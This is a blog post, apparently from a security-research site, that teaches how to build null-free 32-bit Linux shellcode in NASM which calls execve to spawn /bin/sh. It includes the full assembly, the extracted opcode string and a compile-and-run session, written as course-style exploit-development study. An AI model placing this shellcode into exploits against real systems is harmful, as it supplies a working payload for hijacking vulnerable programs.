<!DOCTYPE html>
<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--><!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8"><![endif]--><!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9"><![endif]--><!--[if gt IE 8]><!--><html class="no-js">
<!--<![endif]--> <head> <meta charset="UTF-8"> <meta content="text/html; charset=UTF-8" http-equiv="Content-Type"> <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> <title>/bin/sh execve Stack – popped.io</title> <meta name="description" content="A collection of my security research, random projects and attempts to amuse."> <meta name="keywords" content="Stack, Shellcode, nasm, assembly, execve"> <!-- Twitter Cards --> <meta name="twitter:card" content="summary"> <meta name="twitter:image" content="http://localhost:4000/assets/img/me.png"> <meta name="twitter:title" content="/bin/sh execve Stack"> <meta name="twitter:description" content="The execve SYSCALLA useful SYSCALL that can help with executing a shell is execve."> <meta name="twitter:site" content="@hackerjiv"> <meta name="twitter:creator" content="@hackerjiv"> <!-- Open Graph --> <meta property="og:locale" content="en_US"> <meta property="og:type" content="article"> <meta property="og:title" content="/bin/sh execve Stack"> <meta property="og:description" content="The execve SYSCALLA useful SYSCALL that can help with executing a shell is execve."> <meta property="og:url" content="http://localhost:4000/execve-stack/"> <meta property="og:site_name" content="popped.io"> <meta property="og:image" content="http://localhost:4000/assets/img/me.png"> <link rel="canonical" href="http://localhost:4000/execve-stack/"> <link href="http://localhost:4000/feed.xml" type="application/atom+xml" rel="alternate" title="popped.io Feed"> <!-- Handheld --> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- CSS --> <link rel="stylesheet" href="http://localhost:4000/assets/css/main.css"> <!-- JS --> <script src="http://localhost:4000/assets/js/modernizr-3.3.1.custom.min.js"></script> <!-- Favicons --> <link rel="apple-touch-icon" href="http://localhost:4000/assets/img/favicons/apple-icon-precomposed.png"> <link rel="apple-touch-icon" sizes="72x72" href="http://localhost:4000/assets/img/favicons/apple-icon-72x72.png"> <link rel="apple-touch-icon" sizes="114x114" href="http://localhost:4000/assets/img/favicons/apple-icon-114x114.png"> <link rel="apple-touch-icon" sizes="144x144" href="http://localhost:4000/assets/img/favicons/apple-icon-144x144.png"> <link rel="shortcut icon" type="image/png" href="http://localhost:4000/favicon.png"> <link rel="shortcut icon" href="http://localhost:4000/favicon.ico"> <!-- Background Image --> <style type="text/css">body {background-image:url(http://localhost:4000/assets/img/placeholder-big.jpg); background-repeat: no-repeat; background-size: cover; }</style> <!-- Post Feature Image --> <!-- Begin Jekyll SEO tag v2.2.3 --> <title>/bin/sh execve Stack | popped.io</title> <meta property="og:title" content="/bin/sh execve Stack"> <meta name="author" content="Sanjiv Kawa"> <meta property="og:locale" content="en_US"> <meta name="description" content="The execve SYSCALL A useful SYSCALL that can help with executing a shell is execve."> <meta property="og:description" content="The execve SYSCALL A useful SYSCALL that can help with executing a shell is execve."> <link rel="canonical" href="http://localhost:4000/execve-stack/"> <meta property="og:url" content="http://localhost:4000/execve-stack/"> <meta property="og:site_name" content="popped.io"> <meta property="og:type" content="article"> <meta property="article:published_time" content="2016-12-02T19:15:00-05:00"> <meta name="twitter:card" content="summary"> <meta name="twitter:site" content="@"> <meta name="twitter:creator" content="@Sanjiv Kawa"> <script type="application/ld+json"> {"@context":"http://schema.org","@type":"BlogPosting","headline":"/bin/sh execve Stack","author":{"@type":"Person","name":"Sanjiv Kawa"},"datePublished":"2016-12-02T19:15:00-05:00","dateModified":"2016-12-02T19:15:00-05:00","description":"The execve SYSCALL A useful SYSCALL that can help with executing a shell is execve.","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/me.png"},"name":"Sanjiv Kawa"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/execve-stack/"},"url":"http://localhost:4000/execve-stack/"}</script> <!-- End Jekyll SEO tag --> </head> <body> <nav id="dl-menu" class="dl-menuwrapper" role="navigation"> <button class="dl-trigger">Open Menu</button> <ul class="dl-menu"> <li><a href="http://localhost:4000/">Home</a></li> <li> <a href="#">About</a> <ul class="dl-submenu"> <li> <img src="http://localhost:4000/assets/img/me.png" alt="popped.io photo" class="author-photo"> <h4>popped.io</h4> <p>A collection of my security research, random projects and attempts to amuse.</p> </li> <li><a href="http://localhost:4000/about/"><span class="btn btn-inverse">Learn More</span></a></li> <li> <a href="mailto:sanjiv@popped.io" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-envelope-square"></i> Email</a> </li> <li> <a href="http://twitter.com/hackerjiv" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-twitter-square"></i> Twitter</a> </li> <li> <a href="http://linkedin.com/in/sanjivkawa" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-linkedin-square"></i> LinkedIn</a> </li> <li> <a href="http://github.com/skahwah" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-github"></i> Github</a> </li> </ul>
<!-- /.dl-submenu --> </li> <li> <a href="#">Posts</a> <ul class="dl-submenu"> <li><a href="http://localhost:4000/posts/">All Posts</a></li> <li><a href="http://localhost:4000/tags/">All Tags</a></li> </ul> </li> <li><a href="http://localhost:4000/projects/">Projects</a></li> </ul>
<!-- /.dl-menu --> </nav><!-- /.dl-menuwrapper --> <!-- Header --> <header class="header" role="banner"> <div class="wrapper animated fadeIn"> <div class="content"> <div class="post-title "> <h1>/bin/sh execve Stack</h1> <h4>02 Dec 2016</h4> <p class="reading-time"> <i class="fa fa-clock-o"></i> Reading time ~3 minutes </p>
<!-- /.entry-reading-time --> <a class="btn zoombtn" href="http://localhost:4000/posts/"> <i class="fa fa-chevron-left"></i> </a> </div> <h3 id="the-execve-syscall">The execve SYSCALL</h3> <p>A useful SYSCALL that can help with executing a shell is <code class="highlighter-rouge">execve</code>.</p> <p>Looking at the man page for <code class="highlighter-rouge">execve</code>, there are three main arguments.</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code>SYNOPSIS
       <span class="c">#include &lt;unistd.h&gt;</span>

       int execve<span class="o">(</span>const char <span class="k">*</span>filename, char <span class="k">*</span>const argv[], char <span class="k">*</span>const envp[]<span class="o">)</span>;
</code></pre></div> <p>Argument 1 (<code class="highlighter-rouge">*filename</code>): The program that you want to execute.</p> <p>Argument 2 (<code class="highlighter-rouge">argv[]</code>): An array of argument strings passed to the program. By convention, the first of these strings should contain the filename associated with the file being executed.</p> <p>Argument 3 (<code class="highlighter-rouge">envp[]</code>): The third argument is an array of strings that you can pass in as an additional environment to the program before it is executed. This argument is typically occupied with nulls as it is not used often.</p> <p>To execute <code class="highlighter-rouge">/bin/sh</code>, the first argument, <code class="highlighter-rouge">*filename</code>, should contain a pointer to a string which reads <code class="highlighter-rouge">/bin/sh</code>. The second argument, <code class="highlighter-rouge">argv[]</code> will contain the memory address for a string that contains <code class="highlighter-rouge">/bin/sh</code> as it’s first element, the second element will be <code class="highlighter-rouge">0x00000000</code> to null terminate the array. Lastly, the thrid argument, <code class="highlighter-rouge">envp[]</code>, will contain <code class="highlighter-rouge">0x00000000</code>.</p> <h3 id="building-execve-stacknasm">Building execve-stack.nasm</h3> <p>Based on the arguments required by <code class="highlighter-rouge">execve</code>, the following general purpose registers will contain the corresponding values:</p> <p><code class="highlighter-rouge">EBX</code>: <code class="highlighter-rouge">/bin/sh0x0</code> - to satisfy the requirements of <code class="highlighter-rouge">*filename</code></p> <p><code class="highlighter-rouge">ECX</code>: the address of <code class="highlighter-rouge">/bin/sh,0x00000000</code> - to satisfy the requirements of <code class="highlighter-rouge">argv[]</code></p> <p><code class="highlighter-rouge">EDX</code>: <code class="highlighter-rouge">0x00000000</code> - to satisfy the requirements of <code class="highlighter-rouge">envp[]</code></p> <p><code class="highlighter-rouge">execve</code> does require a fair number of null bytes, this is an inconvenience as this would almost certainly prevent the execution of the shellcode. As a result, the Stack can be used to store all of the arguments required by <code class="highlighter-rouge">execve</code>. This is advantageous as memory locations are referenced to the various registers and null bytes themselves are never actually stored in registers.</p> <h4 id="things-to-consider">Things to consider</h4> <p><code class="highlighter-rouge">/bin/sh</code> is 7 bytes, however adding another <code class="highlighter-rouge">/</code> does not affect the execution of the shell. <code class="highlighter-rouge">//bin/sh</code> is 8 bytes, this alleviates any offset issues that may arise.</p> <p>At times the Stack can be like the <a href="http://strangerthings.wikia.com/wiki/Upside_Down">“Upside Down”</a>. Push things on in reverse order, and remember that the Stack is Last in First Out (LIFO). This means that the last thing that was pushed on to the Stack will be pointed to by the Stack pointer register.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">;execve //bin/sh</span>
<span class="kr">global</span> <span class="n">_start</span>

<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
<span class="n">_start</span><span class="o">:</span>

  <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>  <span class="c">;zero out eax</span>
  <span class="k">push</span> <span class="n">eax</span>      <span class="c">;push 00000000 on to the stack</span>


  <span class="k">push</span> <span class="mh">0x68732f6e</span> <span class="c">;push hex hs/n on to the stack</span>
  <span class="k">push</span> <span class="mh">0x69622f2f</span> <span class="c">;push hex ib// on to the stack</span>

  <span class="c">;at this point the stack contains //bin/sh0x00000000</span>
  <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>  <span class="c">;this satisfies the requirements for *filename (first argument of execve)</span>

  <span class="k">push</span> <span class="n">eax</span>      <span class="c">;push 00000000 on to the stack</span>

  <span class="c">;at this point the stack contains 0x00000000//bin/sh0x00000000</span>
  <span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="n">esp</span>  <span class="c">;we cant pop 0x00000000 into EDX as the shellcode cannot have any null characters.</span>
                <span class="c">;instead we move the current address pointed to by ESP into EDX.</span>
                <span class="c">;this address contains the last value pushed on to the stack, which is 0x00000000</span>
                <span class="c">;this satisfies the requirements for envp (third argument of execve)</span>

  <span class="k">push</span> <span class="n">ebx</span>      <span class="c">;ebx contains the memory address of the stack where //bin/sh0x00000000 is.</span>
  <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>  <span class="c">;this satisfies the requirements for argv (second argument of execve)</span>

  <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mi">11</span>     <span class="c">;execve syscall number, 0xb works also.</span>
  <span class="k">int</span> <span class="mh">0x80</span>       <span class="c">;initiate</span>
</code></pre></div> <p>Source code can also be found <a href="https://github.com/skahwah/slae/blob/master/execve-stack/execve-stack.nasm">here</a>.</p> <p>I built on top of <a href="https://twitter.com/SecurityTube">Vivek's</a> nasm linker and assembler shell script and added the opcode extractor and C compiler used in the SLAE course. You can find <code class="highlighter-rouge">super-compile.sh</code> <a href="https://github.com/skahwah/slae/blob/master/super-compile.sh">here</a>.</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="gp">skawa@ubuntu:~/Desktop/code/execve$ </span>ls
execve-stack.nasm  super-compile.sh
<span class="gp">skawa@ubuntu:~/Desktop/code/execve$ </span>./super-compile.sh execve-stack
<span class="o">[</span>+] Assembling with Nasm
<span class="o">[</span>+] Linking
<span class="o">[</span>+] Extracting Opcodes
<span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>

<span class="o">[</span>+] Creating Shellcode
<span class="o">[</span>+] Compiling Shellcode
<span class="o">[</span>+] Done!
<span class="gp">skawa@ubuntu:~/Desktop/code/execve$ </span>ls
execve-stack       execve-stack.o          shellcode-execve-stack.c
execve-stack.nasm  shellcode-execve-stack  super-compile.sh
<span class="gp">skawa@ubuntu:~/Desktop/code/execve$ </span>./shellcode-execve-stack
Shellcode Length: 25
<span class="gp">$ </span><span class="nb">exit
</span>skawa@ubuntu:~/Desktop/code/execve<span class="err">$</span>
</code></pre></div> <div class="entry-meta">  <br> <hr> <span class="entry-tags"><a href="http://localhost:4000/tags/#Stack" title="Pages tagged Stack" class="tag"><span class="term">Stack</span></a><a href="http://localhost:4000/tags/#Shellcode" title="Pages tagged Shellcode" class="tag"><span class="term">Shellcode</span></a><a href="http://localhost:4000/tags/#nasm" title="Pages tagged nasm" class="tag"><span class="term">nasm</span></a><a href="http://localhost:4000/tags/#assembly" title="Pages tagged assembly" class="tag"><span class="term">assembly</span></a><a href="http://localhost:4000/tags/#execve" title="Pages tagged execve" class="tag"><span class="term">execve</span></a></span> <span class="social-share"> <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/execve-stack/" title="Share on Facebook" class="tag"> <span class="term"><i class="fa fa-facebook-square"></i> Like</span> </a> <a href="https://twitter.com/intent/tweet?text=http://localhost:4000/execve-stack/" title="Share on Twitter" class="tag"> <span class="term"><i class="fa fa-twitter-square"></i> Tweet</span> </a> <a href="https://plus.google.com/share?url=http://localhost:4000/execve-stack/" title="Share on Google+" class="tag"> <span class="term"><i class="fa fa-google-plus-square"></i> +1</span> </a> </span> <div style="clear:both"></div> </div> </div> </div> <section id="disqus_thread" class="animated fadeInUp"></section><!-- /#disqus_thread --> </header> <!-- JS --> <script src="http://localhost:4000/assets/js/jquery-1.12.0.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.dlmenu.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.goup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.magnific-popup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.fitvid.min.js"></script> <script src="http://localhost:4000/assets/js/scripts.js"></script> <!-- Asynchronous Google Analytics snippet --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','//www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-85516324-1', 'auto'); ga('require', 'linkid', 'linkid.js'); ga('send', 'pageview'); </script> <script type="text/javascript"> var disqus_shortname = 'sanjivkawa'; (function() { var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true; dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq); })(); (function () { var s = document.createElement('script'); s.async = true; s.type = 'text/javascript'; s.src = '//' + disqus_shortname + '.disqus.com/count.js'; (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s); }()); </script> <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a>
</noscript> <!-- MathJax --> <script async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>  </body>
</html>
